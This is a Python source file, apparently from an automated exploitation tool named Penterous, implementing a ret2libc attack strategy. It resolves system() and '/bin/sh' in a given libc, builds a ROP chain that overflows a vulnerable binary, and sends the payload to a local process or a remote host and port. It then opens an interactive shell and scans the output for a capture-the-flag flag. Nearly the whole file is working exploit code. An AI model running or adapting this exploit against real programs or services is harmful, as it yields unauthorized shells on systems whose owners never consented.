"""
Penterous — ret2libc strategy: ASLR off, known libc.
"""
import time
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error


class Ret2LibcStrategy(ExploitStrategy):
    """
    ASLR is off → libc addresses are fixed.
    Payload: padding | pop rdi | /bin/sh | system()
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'ret2libc'

        if not self.binary.libc:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "libc not provided — use --libc", mode=mode)

        try:
            system_addr = self.binary.libc.symbols['system']
            bin_sh_addr = next(self.binary.libc.search(b'/bin/sh'))
        except Exception as e:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     f"Cannot find system or /bin/sh in libc: {e}", mode=mode)

        info(f"system()  @ 0x{system_addr:x}")
        info(f"/bin/sh   @ 0x{bin_sh_addr:x}")

        payload = self.rop.build_system_chain(self.offset, system_addr, bin_sh_addr)
        info(f"Payload size: {len(payload)} bytes")

        tube = self._get_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, payload, b'', start,
                                     "Failed to create tube", mode=mode)

        output = self._send_and_receive(tube, payload, interactive_shell=True)
        flag = self.hunter.hunt(output)

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
        )
